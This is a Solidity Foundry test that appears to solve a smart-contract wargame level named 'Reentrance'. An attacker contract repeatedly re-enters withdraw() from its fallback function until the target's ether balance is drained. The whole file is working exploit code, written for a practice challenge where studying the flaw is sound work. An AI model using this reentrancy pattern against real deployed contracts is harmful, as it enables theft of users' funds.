// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../src/level10.sol";

contract POC is Test {
    Reentrance level10 = new Reentrance();

    function test() external {
        vm.startBroadcast();
        level10.donate{value: 50 ether}(address(this));
        ReentranceAttacker attacker = new ReentranceAttacker{value: 1 ether}(
            level10
        );
        attacker.attack();
        level10.balanceOf(address(attacker));
        vm.stopBroadcast();
    }
}

contract ReentranceAttacker {
    Reentrance reentrance;

    constructor(Reentrance _reentrance) public payable {
        reentrance = _reentrance;
    }

    function attack() external payable {
        reentrance.donate{value: 1 ether}(address(this));
        reentrance.withdraw(1 ether);
    }

    fallback() external payable {
        if (address(reentrance).balance >= 1 ether) {
            reentrance.withdraw(1 ether);
        }
    }
}
